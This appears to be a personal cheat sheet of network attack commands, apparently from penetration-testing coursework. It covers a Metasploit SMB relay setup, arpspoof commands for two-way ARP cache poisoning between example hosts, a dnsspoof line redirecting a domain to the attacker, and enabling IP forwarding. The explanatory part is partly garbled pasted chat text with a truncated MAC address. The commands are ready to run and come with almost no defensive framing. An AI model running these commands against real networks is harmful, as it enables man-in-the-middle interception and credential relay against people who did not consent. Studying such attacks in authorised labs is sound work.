## MSFconsole for smb relay attack
```
search smb_relay
use 0
set SRVHOST $attacking_machine_ip
set LHOST $attacking_machine_ip
set SMBHOST $file_server_ip
exploit
```

## Arpspoof
### Spoofing command 
- Spoof $first_ip to convince $second_ip:$attacking_machine_mac
```
arpspoof -i eth1 -t $first_ip $second_ip
```
```
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
Spoofing Device 1 to Device 2

Attacker’s Machine sends ARP replies to Device 1 (IP 172.16.5.1), falsely claiming that Attacker’s MAC (AA:AA:AA:AA:AA
) is associated with IP 172.16.5.5.
Device 1 updates its ARP cache with this incorrect mapping:
ruby
Copy code
IP: 172.16.5.5 -> MAC: AA:AA:AA:AA:AA:AA
Spoofing Device 2 to Device 1

Attacker’s Machine also sends ARP replies to Device 2 (IP 172.16.5.5), falsely claiming that Attacker’s MAC (AA:AA:AA:AA:AA
) is associated with IP 172.16.5.1.
Device 2 updates its ARP cache with this incorrect mapping:
ruby
Copy code
IP: 172.16.5.1 -> MAC: AA:AA:AA:AA:AA:AA
```

## Dnsspoof
```
echo "$attacking_machine_ip *.sportsfoo.com" > dns;dnsspoof -i eth1 -f dns
```
## ip_forward
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```



